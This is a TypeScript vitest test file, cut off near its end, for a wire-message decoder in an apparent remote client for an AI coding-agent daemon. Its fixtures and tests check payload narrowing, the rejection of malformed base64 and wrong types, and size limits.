import { describe, it, expect, vi } from 'vitest'
import { parseInboundMessage } from './inboundMessage'
import { encodeEnvelope, base64StdEncode, WireDecodeError } from './codec'
import { createDiagnosticLog, type DiagnosticLog } from '../diagnosticLog'
import {
  MAX_PLAINTEXT_BYTES,
  type MessagePayload,
  type ToolUsePayload,
  type ToolResultPayload
} from '../../shared/wire/types'

// parseInboundMessage sits on the untrusted→trusted boundary, mirroring parseHelloAck: it is fed
// bytes a malicious relay peer could shape. Inputs are built with the REAL codec (encodeEnvelope) so
// the assertions pin actual wire bytes, exactly like daemonConnection.test.ts's validHelloAck().
const FIXED_TS = '2026-07-04T12:00:00.000Z'

const MSG: MessagePayload = {
  conversation_id: 'c1',
  message_id: 'm1',
  role: 'assistant',
  text: 'hi there'
}
const MSG_A: MessagePayload = { conversation_id: 'c1', message_id: 'm1', role: 'user', text: 'one' }
const MSG_B: MessagePayload = {
  conversation_id: 'c1',
  message_id: 'm2',
  role: 'assistant',
  text: 'two'
}

/** A `message` envelope's plaintext bytes, wrapping an arbitrary (possibly malformed) payload. */
function encodeMessage(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 5, type: 'message', ts: FIXED_TS, payload })
}

/** A `message_chunk` envelope's plaintext bytes, wrapping an arbitrary (possibly malformed) payload. */
function encodeChunk(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 6, type: 'message_chunk', ts: FIXED_TS, payload })
}

/** A `debug_bundle_chunk` envelope's plaintext bytes, wrapping an arbitrary payload (#116). */
function encodeBundleChunk(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 7, type: 'debug_bundle_chunk', ts: FIXED_TS, payload })
}

/** A `debug_bundle_done` envelope's plaintext bytes, wrapping an arbitrary payload (#116). */
function encodeBundleDone(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 8, type: 'debug_bundle_done', ts: FIXED_TS, payload })
}

/**
 * A `screen_snapshot` envelope's plaintext bytes, wrapping an arbitrary payload. No longer a modeled
 * type (#622): this now builds THE unmodeled frame this file pins — a realistic wire type the daemon
 * can still emit and that the decoder deliberately does not narrow.
 */
function encodeSnapshot(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 9, type: 'screen_snapshot', ts: FIXED_TS, payload })
}

/** A `session_settings` envelope's plaintext bytes, wrapping an arbitrary payload (#491). */
function encodeSessionSettings(payload: unknown, inReplyTo = 812): Uint8Array {
  return encodeEnvelope({
    id: 45,
    type: 'session_settings',
    ts: FIXED_TS,
    in_reply_to: inReplyTo,
    payload
  })
}

/** A fully-populated, well-formed session_settings payload (#491). */
const RUN_CONFIG = {
  session_id: 'sess-a',
  model: 'claude-opus-4-8',
  effort: 'high',
  yolo: false,
  used_tokens: 12480,
  window_tokens: 200000
}

/** An `assistant_delta` envelope's plaintext bytes, wrapping an arbitrary payload (#199). */
function encodeAssistantDelta(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 10, type: 'assistant_delta', ts: FIXED_TS, payload })
}

/** A `turn_end` envelope's plaintext bytes, wrapping an arbitrary payload (#199). */
function encodeTurnEnd(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 11, type: 'turn_end', ts: FIXED_TS, payload })
}

/** A `conversations` envelope's plaintext bytes, wrapping an arbitrary payload (#139). */
function encodeConversations(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 12, type: 'conversations', ts: FIXED_TS, payload })
}

/** A `recent_workspaces_list` envelope's plaintext bytes, wrapping an arbitrary payload (#380). */
function encodeRecentWorkspaces(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 14, type: 'recent_workspaces_list', ts: FIXED_TS, payload })
}

/** A `turn_state` envelope's plaintext bytes, wrapping an arbitrary payload (#214). */
function encodeTurnState(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 13, type: 'turn_state', ts: FIXED_TS, payload })
}

/** A `tool_use` envelope's plaintext bytes, wrapping an arbitrary payload (#217). */
function encodeToolUse(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 14, type: 'tool_use', ts: FIXED_TS, payload })
}

/** A `tool_result` envelope's plaintext bytes, wrapping an arbitrary payload (#229). */
function encodeToolResult(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 17, type: 'tool_result', ts: FIXED_TS, payload })
}

/** A `modal_shown` envelope's plaintext bytes, wrapping an arbitrary payload (#201). */
function encodeModalShown(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 15, type: 'modal_shown', ts: FIXED_TS, payload })
}

/** A `modal_dismissed` envelope's plaintext bytes, wrapping an arbitrary payload (#201). */
function encodeModalDismissed(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 16, type: 'modal_dismissed', ts: FIXED_TS, payload })
}

/** A `question_shown` envelope's plaintext bytes, wrapping an arbitrary payload (#884). */
function encodeQuestionShown(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 901, type: 'question_shown', ts: FIXED_TS, payload })
}

/** A `slash_command_list` envelope's plaintext bytes, wrapping an arbitrary payload (#936). */
function encodeSlashCommandList(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 903, type: 'slash_command_list', ts: FIXED_TS, payload })
}

/** A `question_dismissed` envelope's plaintext bytes, wrapping an arbitrary payload (#894). */
function encodeQuestionDismissed(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 902, type: 'question_dismissed', ts: FIXED_TS, payload })
}

/** A `conversation_created` envelope's plaintext bytes, wrapping an arbitrary payload (#241). */
function encodeConversationCreated(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 18, type: 'conversation_created', ts: FIXED_TS, payload })
}

/** A `conversation_updated` envelope's plaintext bytes, wrapping an arbitrary payload (#273). */
function encodeConversationUpdated(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 19, type: 'conversation_updated', ts: FIXED_TS, payload })
}

/** A `conversation_deleted` envelope's plaintext bytes, wrapping an arbitrary payload (#375). */
function encodeConversationDeleted(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 20, type: 'conversation_deleted', ts: FIXED_TS, payload })
}

/** A `workspace_folder_created` envelope's plaintext bytes, wrapping an arbitrary payload (#381). */
function encodeWorkspaceFolderCreated(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 21, type: 'workspace_folder_created', ts: FIXED_TS, payload })
}

/** A `session_transition` envelope's plaintext bytes, wrapping an arbitrary payload (#254). */
function encodeSessionTransition(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 19, type: 'session_transition', ts: FIXED_TS, payload })
}

/** A `session_settings_updated` envelope's plaintext bytes, wrapping an arbitrary payload (#264). The
 *  optional `inReplyTo` rides the ENVELOPE (not the payload) — the #261 request↔reply correlation id. */
function encodeSessionSettingsUpdated(payload: unknown, inReplyTo?: number): Uint8Array {
  return encodeEnvelope({
    id: 20,
    type: 'session_settings_updated',
    ts: FIXED_TS,
    payload,
    ...(inReplyTo !== undefined ? { in_reply_to: inReplyTo } : {})
  })
}

/** A `queue_state` envelope's plaintext bytes, wrapping an arbitrary payload (#292). */
function encodeQueueState(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 21, type: 'queue_state', ts: FIXED_TS, payload })
}

/** A `stall` envelope's plaintext bytes, wrapping an arbitrary payload (#315). */
function encodeStall(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 22, type: 'stall', ts: FIXED_TS, payload })
}

/** An `api_retry` envelope's plaintext bytes, wrapping an arbitrary payload (#492). */
function encodeApiRetry(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 23, type: 'api_retry', ts: FIXED_TS, payload })
}

/** A `compacting` envelope's plaintext bytes, wrapping an arbitrary payload (#495). */
function encodeCompacting(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 24, type: 'compacting', ts: FIXED_TS, payload })
}

/** A `model_announced` envelope's plaintext bytes, wrapping an arbitrary payload (#587). */
function encodeModelAnnounced(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 29, type: 'model_announced', ts: FIXED_TS, payload })
}

/** A `background_task_started` envelope's plaintext bytes, wrapping an arbitrary payload (#564). */
function encodeBackgroundTaskStarted(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 26, type: 'background_task_started', ts: FIXED_TS, payload })
}

/** A `background_task_updated` envelope's plaintext bytes, wrapping an arbitrary payload (#565). */
function encodeBackgroundTaskUpdated(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 27, type: 'background_task_updated', ts: FIXED_TS, payload })
}

/** A `background_task_roster` envelope's plaintext bytes, wrapping an arbitrary payload (#566). */
function encodeBackgroundTaskRoster(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 28, type: 'background_task_roster', ts: FIXED_TS, payload })
}

/** An `unrecognized_message` envelope's plaintext bytes, wrapping an arbitrary payload. */
function encodeUnrecognized(payload: unknown): Uint8Array {
  return encodeEnvelope({ id: 25, type: 'unrecognized_message', ts: FIXED_TS, payload })
}

/**
 * The payload the daemon used to send on a `screen_snapshot` (#180). Retained after #622 unmodeled the
 * type, so the pins below exercise a realistic frame rather than an empty one — and, for the log pin,
 * one carrying sensitive rendered terminal text.
 */
const SNAPSHOT = {
  conversation_id: 'conv-1',
  text: 'rendered screen contents',
  ts: '2026-07-08T00:00:00Z',
  model: 'claude-opus-4-8',
  effort: 'high',
  yolo: true,
  used_tokens: 45000,
  window_tokens: 200000
}

/** A fully-populated, well-formed assistant_delta payload (#199). */
const DELTA = {
  conversation_id: 'conv-1',
  turn_id: 'turn-1',
  seq: 3,
  text: 'one incremental slice'
}

/** A fully-populated, well-formed turn_end payload (#199). */
const TURN_END = {
  conversation_id: 'conv-1',
  turn_id: 'turn-1',
  stop_reason: 'end_turn'
}

/** A fully-populated, well-formed turn_state payload (#214). */
const TURN_STATE = {
  conversation_id: 'conv-1',
  state: 'thinking'
}

/** A fully-populated, well-formed stall payload — `conversation_id` only (#315). */
const STALL = {
  conversation_id: 'conv-1'
}

/** A well-formed api_retry payload on the rising edge — the daemon's canonical fixture (#492). */
const API_RETRY = {
  conversation_id: 'c1',
  active: true,
  current: 3,
  total: 10
}

/** A well-formed compacting payload on the rising edge — the daemon's canonical fixture (#495). */
const COMPACTING = {
  conversation_id: 'c1',
  active: true
}

/** A well-formed model_announced payload — the daemon's canonical fixture VERBATIM (#587,
 *  pyrycode/internal/protocol/testdata/model_announced.json). All three fields are always present. */
const MODEL_ANNOUNCED = {
  conversation_id: 'c1',
  model: 'claude-haiku-4-5-20251001',
  truncated: true
}

/** A well-formed background_task_started payload — the daemon's canonical fixture (#564). Every field
 *  carries a DISTINCT non-empty value, so a field swap or a dropped field fails the round-trip (AC1),
 *  and the `description` is deliberately adversarial: HTML metacharacters, a quote, a shell redirect
 *  and a trailing backgrounding `&`. */
const BACKGROUND_TASK_STARTED = {
  conversation_id: 'c1',
  task_id: 'task_01ABC',
  tool_call_id: 'toolu_01XYZ',
  description: "grep -rn 'a<b&c' . > /tmp/out.txt &",
  task_type: 'local_bash',
  truncated_fields: ['description']
}

/** A well-formed background_task_updated payload — the daemon's canonical fixture VERBATIM
 *  (internal/protocol/testdata/background_task_updated.json, #565). Four fields, each a DISTINCT
 *  non-empty value, so a field swap or a dropped field fails the round-trip (AC1). The `patch` is
 *  deliberately adversarial by the DAEMON's own choice: it is cut mid-token (`":tr`) and is therefore
 *  NOT VALID JSON, which is what makes AC2's invalid-JSON case the happy path rather than a synthetic
 *  one. */
const BACKGROUND_TASK_UPDATED = {
  conversation_id: 'c1',
  task_id: 'task_01ABC',
  patch: '{"is_backgrounded":tr',
  truncated_fields: ['patch']
}

/** A well-formed background_task_roster payload — the daemon's canonical fixture VERBATIM
 *  (internal/protocol/testdata/background_task_roster.json, #566). Deliberately adversarial by the
 *  DAEMON's own choice: TWO rows whose `truncated_fields` shapes DIFFER (a populated list and a literal
 *  `null`), every field on every row a DISTINCT value so a row swap / a dropped field / a flattened
 *  `truncated_fields` fails the round-trip (AC1), a NON-ZERO `dropped_tasks`, and a first `description`
 *  carrying HTML metacharacters (`a<b&c`) on purpose. */
const BACKGROUND_TASK_ROSTER = {
  conversation_id: 'c1',
  tasks: [
    {
      task_id: 'task_01ABC',
      task_type: 'local_bash',
      description: "grep -rn 'a<b&c' .",
      truncated_fields: ['description']
    },
    {
      task_id: 'task_02DEF',
      task_type: 'local_bash',
      description: 'sleep 300',
      truncated_fields: null
    }
  ],
  dropped_tasks: 3
}

/** The daemon's second canonical fixture (background_task_roster_empty.json, #566): an EMPTY roster —
 *  the positive statement that nothing is alive, and AC2's signal case. */
const BACKGROUND_TASK_ROSTER_EMPTY = {
  conversation_id: 'c1',
  tasks: [],
  dropped_tasks: 0
}

/** A well-formed unrecognized_message payload — the daemon's canonical fixture. */
const UNRECOGNIZED = {
  conversation_id: 'c1',
  site: 'line_type',
  message_type: 'some_future_event',
  raw: '{"type":"some_future_event","detail":"something new"}',
  truncated: false
}

/** A fully-populated, well-formed tool_use payload (#217). */
const TOOL_USE = {
  conversation_id: 'conv-1',
  turn_id: 'turn-1',
  tool_use_id: 'tu-1',
  name: 'Read',
  input_summary: 'reads /etc/hosts'
}

/** A tool_use payload carrying the `input` map (#642) — the post-pyrycode#1678 daemon's shape. The
 *  values exercise the wire facts: every value is ALREADY a string daemon-side, so a stringified JSON
 *  literal stays that literal STRING, and a value the daemon shortened keeps its trailing `…` verbatim. */
const TOOL_USE_WITH_INPUT = {
  ...TOOL_USE,
  input: {
    file_path: '/etc/hosts',
    limit: 'null',
    all: 'true',
    lines: '[1,2]',
    command: 'grep -rn needle /etc …'
  }
}

/** A fully-populated, well-formed tool_result payload — a success (#229). */
const TOOL_RESULT = {
  conversation_id: 'conv-1',
  turn_id: 'turn-1',
  tool_use_id: 'tu-1',
  is_error: false,
  result_summary: 'read 12 lines'
}

/** A fully-populated, well-formed queue_state payload — an ordered two-item backlog (#292). */
const QUEUE_STATE = {
  conversation_id: 'conv-1',
  queued: [
    { queued_msg_id: 1, text: 'first queued', ts: '2026-07-10T00:00:00Z' },
    { queued_msg_id: 2, text: 'second queued', ts: '2026-07-10T00:00:01Z' }
  ]
}

/** A fully-populated, well-formed modal_shown payload with two ordered options (#201, #870). */
const MODAL_SHOWN = {
  conversation_id: 'conv-7f3a',
  modal_id: 'mdl-7f3a',
  class: 'permission',
  title: 'Allow Bash?',
  prompt: 'claude wants to run: rm -rf build/',
  options: [
    { id: 'allow', label: 'Allow' },
    { id: 'deny', label: 'Deny' }
  ],
  default_option_id: 'deny'
}

/** A fully-populated, well-formed modal_dismissed payload (#201). */
const MODAL_DISMISSED = {
  modal_id: 'mdl-7f3a',
  outcome: 'allow',
  source: 'remote'
}

/**
 * A fully-populated, well-formed question_shown payload (#884). Lifted VERBATIM from the daemon's own
 * committed encoder output (`internal/protocol/testdata/question_shown.json`), as #883's type tests were:
 * the pin is against the daemon's encoder rather than a hand-written guess, so a contract change surfaces
 * as a fixture diff. Two questions, `multi_select` false then true, options in wire order.
 */
const QUESTION_SHOWN = {
  conversation_id: 'conv-1',
  question_batch_id: 'qb-7f3a',
  questions: [
    {
      question: 'Which write strategy should the cache use?',
      header: 'Write strategy',
      options: [
        { label: 'Write-through', description: 'Writes reach the cache and the store together.' },
        { label: 'Write-behind', description: 'Writes reach the cache first, the store later.' }
      ],
      multi_select: false
    },
    {
      question: 'Which eviction policies should it support?',
      header: 'Eviction',
      options: [
        { label: 'LRU', description: 'Evict the least recently used entry.' },
        { label: 'LFU', description: 'Evict the least frequently used entry.' },
        { label: 'TTL', description: 'Evict entries after a fixed time to live.' }
      ],
      multi_select: true
    }
  ]
}

/** The daemon's `question_shown_zero.json` — every string empty, one option (#884). Empty is a VALUE. */
const QUESTION_SHOWN_ZERO = {
  conversation_id: '',
  question_batch_id: '',
  questions: [
    { question: '', header: '', options: [{ label: '', description: '' }], multi_select: false }
  ]
}

/** One well-formed question, for building single-question reject cases without restating the batch. */
const ONE_QUESTION = QUESTION_SHOWN.questions[0]

/**
 * A fully-populated, well-formed slash_command_list payload (#936). Lifted from the daemon's committed
 * fixture (`internal/protocol/testdata/slash_command_list.json`) through #935's `types.test.ts` block,
 * character for character, so the two files cannot drift into two hand-written guesses of one upstream
 * file. Five rows in claude's own order, ONE reporting a cut `description` beside four reporting `null`,
 * and a NON-ZERO `dropped_commands` whose sum with the list length is the menu's true size.
 *
 * `claude-api`'s description is ABRIDGED, the one departure #935 also took: the fixture's is 1,145 bytes
 * of prose, none of it contract-bearing, and the stand-in keeps both byte-level properties measured on
 * the real string — an embedded newline (`0x0a` is the ONLY sub-`0x20` byte anywhere across the capture's
 * 51 entries' four string fields) and a non-ASCII rune.
 *
 * Adversarial by the DAEMON's own choice: `model`'s hint is a raw `<model>` (Go's encoder escapes
 * `<`/`>`/`&` on the wire, so the decoded value holds the literal angle brackets — the exact byte a render
 * sink is tempted by), and the alias lists differ in length across rows so a flattened or reordered
 * `aliases` fails the round-trip.
 */
const SLASH_COMMAND_LIST = {
  conversation_id: 'c1',
  commands: [
    {
      name: 'claude-api',
      argument_hint: '',
      description: 'Reference for the Claude API — model ids, pricing, params.\nTRIGGER — read first.',
      aliases: [],
      truncated_fields: ['description']
    },
    {
      name: 'clear',
      argument_hint: '[name]',
      description:
        'Start a new session with empty context; previous session stays on disk (resumable with /resume)',
      aliases: ['reset', 'new'],
      truncated_fields: null
    },
    {
      name: 'config',
      argument_hint: 'key=value',
      description: 'Set a setting by key',
      aliases: ['settings'],
      truncated_fields: null
    },
    {
      name: 'model',
      argument_hint: '<model>',
      description: 'Set the AI model for Claude Code',
      aliases: [],
      truncated_fields: null
    },
    {
      name: 'usage',
      argument_hint: '',
      description: "Show session cost, plan usage, and what's contributing to your limits",
      aliases: ['cost', 'stats'],
      truncated_fields: null
    }
  ],
  dropped_commands: 2
}

/**
 * The daemon's second committed fixture (`slash_command_list_empty.json`, #936): an EMPTY menu — the
 * positive statement that claude offered nothing, and the case that must stay distinguishable from a
 * frame that never arrived.
 */
const SLASH_COMMAND_LIST_EMPTY = {
  conversation_id: 'c1',
  commands: [],
  dropped_commands: 0
}

/**
 * The daemon's third committed fixture (`slash_command_list_zero.json`, #936): one all-zero row, which is
 * the only route that reaches all five WireSlashCommand keys at once — a frame with no entries reaches
 * none of them. Every empty here is a VALUE: no key on either struct carries `omitempty`.
 */
const SLASH_COMMAND_LIST_ZERO = {
  conversation_id: '',
  commands: [{ name: '', argument_hint: '', description: '', aliases: [], truncated_fields: null }],
  dropped_commands: 0
}

/** One well-formed command row, for building single-row reject cases without restating the menu. */
const ONE_COMMAND = SLASH_COMMAND_LIST.commands[1]

/**
 * A fully-populated, well-formed question_dismissed payload (#894). The nonce matches QUESTION_SHOWN's,
 * so the pair reads as the batch and its own retirement.
 *
 * The values are NOT the daemon's committed fixture's, and that inverts QUESTION_SHOWN's habit
 * deliberately: `internal/protocol/testdata/question_dismissed.json` carries `source: "timeout"`, a
 * SHAPE fixture from the declaring slice (pyrycode#1974) minted before any producer existed. The landed
 * producer contradicts it — `retireQuestion` emits the compile-time constants `outcomeQuestionUnanswered`
 * / `sourceQuestionNoAnswer` on every one of its three terminal paths. Keys from the fixture, values from
 * the producer.
 *
 * The three values are PAIRWISE DISTINCT on purpose: `outcome` and `source` are both plain `string`, so a
 * transposition between them is invisible to tsc and only an exact `toEqual` over distinct values catches it.
 */
const QUESTION_DISMISSED = {
  question_batch_id: 'qb-7f3a',
  outcome: 'unanswered',
  source: 'no_answer'
}

/** A well-formed conversation summary with a string name — a saved channel (#139). */
const CONV_NAMED = {
  id: 'conv-1',
  name: 'My channel',
  is_promoted: true,
  is_archived: false,
  cwd: '/home/user/project',
  last_message_ts: '2026-07-08T00:00:00Z',
  last_used_at: '2026-07-09T00:00:00Z'
}

/** A well-formed conversation summary with a null name — an unnamed, archived scratch discussion (#139). */
const CONV_UNNAMED = {
  id: 'conv-2',
  name: null,
  is_promoted: false,
  is_archived: true,
  cwd: '/tmp/scratch',
  last_message_ts: '2026-07-07T00:00:00Z',
  last_used_at: '2026-07-07T12:00:00Z'
}

/** A well-formed recent-workspace row — path + opaque last_used_at (#380). */
const WS_ONE = { path: '/home/user/project', last_used_at: '2026-07-09T00:00:00Z' }

/** A second recent-workspace row, to prove wire order is preserved (#380). */
const WS_TWO = { path: '/tmp/scratch', last_used_at: '2026-07-07T12:00:00Z' }

/** A well-formed conversation_created reply with a string name — its OWN 5-field shape (#241). */
const CREATED_NAMED = {
  id: 'conv-9',
  is_promoted: true,
  cwd: '/home/user/project',
  name: 'design review',
  last_used_at: '2026-07-10T00:00:00Z'
}

/** A well-formed conversation_created reply with a null name — an unnamed scratch conversation (#241). */
const CREATED_UNNAMED = {
  id: 'conv-10',
  is_promoted: false,
  cwd: '/tmp/scratch',
  name: null,
  last_used_at: '2026-07-10T01:00:00Z'
}

/** A well-formed conversation_updated reply with a string name — a promoted channel, name before cwd (#273). */
const UPDATED_NAMED = {
  id: 'conv-9',
  is_promoted: true,
  name: 'weekly sync',
  cwd: '/home/user/project',
  last_used_at: '2026-07-12T00:00:00Z'
}

/** A well-formed conversation_updated reply with a null name — an update that left the name unset (#273). */
const UPDATED_UNNAMED = {
  id: 'conv-10',
  is_promoted: true,
  name: null,
  cwd: '/tmp/scratch',
  last_used_at: '2026-07-12T01:00:00Z'
}

/** A well-formed conversation_deleted reply — a single required `id`, the deleted row (#375).
 *  Note the field is `id`, NOT `conversation_id` (the request's field) — do not drift it. */
const DELETED = { id: 'conv-9' }

/** A well-formed workspace_folder_created reply — a single required `path`, the created folder (#381).
 *  `path` is the daemon-side canonical path; a remote, opaque display string never resolved locally. */
const FOLDER_CREATED = { path: '/home/user/projects/new-app' }

/** A fully-populated, well-formed session_transition payload — a /clear rotation, workspace_cwd null (#254). */
const SESSION_TRANSITION = {
  previous_session_id: 'sess-1',
  new_session_id: 'sess-2',
  reason: 'clear',
  occurred_at: '2026-07-10T00:00:00.000000000Z',
  workspace_cwd: null
}

/** A well-formed session_settings_updated reply — its one field, the addressing key (#264). */
const SESSION_SETTINGS_UPDATED = {
  session_id: 'sess-2'
}

describe('parseInboundMessage — happy', () => {
  it('narrows a valid message envelope into a message result', () => {
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
  })

  it('drops unknown payload keys, keeping only the four known fields', () => {
    const withExtras = encodeMessage({ ...MSG, extra: 'ignore-me', event_ptr: 99 })
    expect(parseInboundMessage(withExtras)).toEqual({ kind: 'message', message: MSG })
  })

  it('accepts both user and assistant roles', () => {
    const user: MessagePayload = { ...MSG, role: 'user' }
    expect(parseInboundMessage(encodeMessage(user))).toEqual({ kind: 'message', message: user })
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
  })

  it('narrows a message_chunk into an ordered batch', () => {
    const result = parseInboundMessage(encodeChunk({ messages: [MSG_A, MSG_B] }))
    expect(result).toEqual({ kind: 'chunk', messages: [MSG_A, MSG_B] })
  })

  it('treats an empty message_chunk as a valid zero-length batch', () => {
    expect(parseInboundMessage(encodeChunk({ messages: [] }))).toEqual({ kind: 'chunk', messages: [] })
  })
})

describe('parseInboundMessage — ignored envelope types (AC5)', () => {
  it('returns null for envelope types other than the modeled set, without throwing', () => {
    // `error` is now modeled (→ daemon-error) so it is no longer in this ignored set (#116).
    for (const type of ['ack', 'hello_ack', 'something-else']) {
      const bytes = encodeEnvelope({ id: 1, type, ts: FIXED_TS, payload: {} })
      expect(parseInboundMessage(bytes)).toBeNull()
    }
  })
})

describe('parseInboundMessage — debug-bundle recognition (#116, additive)', () => {
  it('narrows a debug_bundle_chunk into { kind, seq, data } with base64-decoded bytes', () => {
    const raw = new Uint8Array([1, 2, 3, 250])
    const result = parseInboundMessage(encodeBundleChunk({ seq: 0, data: base64StdEncode(raw) }))
    expect(result).toEqual({ kind: 'bundle-chunk', seq: 0, data: raw })
  })

  it('preserves a non-zero seq and decodes an empty-data chunk to zero bytes', () => {
    const result = parseInboundMessage(encodeBundleChunk({ seq: 5, data: '' }))
    expect(result).toEqual({ kind: 'bundle-chunk', seq: 5, data: new Uint8Array(0) })
  })

  it('narrows a debug_bundle_done into { kind, total }', () => {
    expect(parseInboundMessage(encodeBundleDone({ total: 3 }))).toEqual({
      kind: 'bundle-done',
      total: 3
    })
  })

  it('narrows a daemon error into a content-free { kind: daemon-error }', () => {
    // The ErrorPayload fields are present on the wire but must NOT be surfaced.
    const bytes = encodeEnvelope({
      id: 1,
      type: 'error',
      ts: FIXED_TS,
      payload: { code: 'server.binary_offline', message: 'secret daemon detail', retryable: true }
    })
    expect(parseInboundMessage(bytes)).toEqual({ kind: 'daemon-error' })
  })

  it('carries the Envelope in_reply_to onto the daemon-error kind as inReplyTo (#269 correlation id)', () => {
    // The numeric routing id crosses; the ErrorPayload code/message never do (content-free).
    const bytes = encodeEnvelope({
      id: 1,
      type: 'error',
      ts: FIXED_TS,
      in_reply_to: 7,
      payload: { code: 'protocol.malformed', message: 'secret daemon detail', retryable: false }
    })
    expect(parseInboundMessage(bytes)).toEqual({ kind: 'daemon-error', inReplyTo: 7 })
  })

  it('leaves inReplyTo undefined when a daemon error omits in_reply_to (correlation fails closed downstream)', () => {
    const bytes = encodeEnvelope({
      id: 1,
      type: 'error',
      ts: FIXED_TS,
      payload: { code: 'session.not_found', message: 'secret daemon detail', retryable: false }
    })
    const result = parseInboundMessage(bytes)
    expect(result).toEqual({ kind: 'daemon-error' })
    // Explicit: the carrier is present-but-undefined, so daemonConnection's lookup short-circuits.
    expect(result?.kind === 'daemon-error' && result.inReplyTo).toBeUndefined()
  })

  it('still routes a message / message_chunk to its existing kind (additive, unchanged)', () => {
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
    expect(parseInboundMessage(encodeChunk({ messages: [MSG_A] }))).toEqual({
      kind: 'chunk',
      messages: [MSG_A]
    })
  })
})

describe('parseInboundMessage — debug-bundle fail-closed (#116, AC3/AC4)', () => {
  it('throws on non-canonical / malformed base64 chunk data', () => {
    const bad = ['not valid base64 !!!', 'YQ==garbage', 'YR==']
    for (const data of bad) {
      expect(() => parseInboundMessage(encodeBundleChunk({ seq: 0, data }))).toThrow(WireDecodeError)
    }
  })

  it('throws on a missing or non-string chunk data', () => {
    const bad: unknown[] = [{ seq: 0 }, { seq: 0, data: 5 }, { seq: 0, data: null }]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeBundleChunk(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws on a missing or non-number chunk seq', () => {
    const bad: unknown[] = [{ data: '' }, { seq: '0', data: '' }, { seq: null, data: '' }]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeBundleChunk(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a debug_bundle_chunk payload is not an object', () => {
    expect(() => parseInboundMessage(encodeBundleChunk('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeBundleChunk(['a']))).toThrow(WireDecodeError)
  })

  it('throws on a missing or non-number done total', () => {
    const bad: unknown[] = [{}, { total: '3' }, { total: null }]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeBundleDone(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a debug_bundle_done payload is not an object', () => {
    expect(() => parseInboundMessage(encodeBundleDone('nope'))).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — screen_snapshot is no longer modeled (#622)', () => {
  it('returns null for a well-formed screen_snapshot, without throwing (AC2)', () => {
    // `Envelope.type` is an open union (`EnvelopeType | string`), so dropping the modeled member does
    // not make this frame unrepresentable or fatal — it falls to the tolerant `default` arm. Pinned
    // rather than assumed: a client that crashed on an unexpected type would be the worse failure.
    expect(parseInboundMessage(encodeSnapshot(SNAPSHOT))).toBeNull()
  })

  it('returns null for a malformed screen_snapshot payload rather than throwing (AC3)', () => {
    // What used to be the fail-closed set is inert: no arm inspects this payload any more, so each of
    // these reaches the `default` arm by exactly the path the well-formed frame takes.
    const bad: unknown[] = [
      { ...SNAPSHOT, conversation_id: undefined },
      { ...SNAPSHOT, ts: 42 },
      { ...SNAPSHOT, yolo: 'nope' },
      { ...SNAPSHOT, used_tokens: '45000' }
    ]
    for (const payload of bad) {
      expect(parseInboundMessage(encodeSnapshot(payload))).toBeNull()
    }
  })

  it('returns null when a screen_snapshot payload is not an object at all', () => {
    // Pins that the isRecord gate is GONE rather than relaxed — the payload is never read.
    expect(parseInboundMessage(encodeSnapshot('nope'))).toBeNull()
    expect(parseInboundMessage(encodeSnapshot(['a']))).toBeNull()
  })

  it('still throws on an oversized plaintext of an UNMODELED type — the size guard precedes the type switch', () => {
    // Retained from the deleted fail-closed block, and retitled to state what it now uniquely proves.
    // Every sibling oversize test in this file uses a MODELED envelope type; after #622 this is the
    // only one whose type is unmodeled, so it is the sole proof that MAX_PLAINTEXT_BYTES bounds a
    // frame BEFORE the switch can route it to the tolerant `default` arm. "Unmodeled types are
    // tolerated" must never become readable as "unmodeled types are unbounded" (AC5).
    const bytes = new TextEncoder().encode(
      JSON.stringify({
        id: 9,
        type: 'screen_snapshot',
        ts: FIXED_TS,
        payload: { ...SNAPSHOT, text: 'x'.repeat(MAX_PLAINTEXT_BYTES) }
      })
    )
    expect(bytes.length).toBeGreaterThan(MAX_PLAINTEXT_BYTES)
    expect(() => parseInboundMessage(bytes)).toThrow(WireDecodeError)
  })

  it('still routes a message / message_chunk to its existing kind (no widening)', () => {
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
    expect(parseInboundMessage(encodeChunk({ messages: [MSG_A] }))).toEqual({
      kind: 'chunk',
      messages: [MSG_A]
    })
  })
})

describe('parseInboundMessage — assistant_delta / turn_end recognition (#199, additive)', () => {
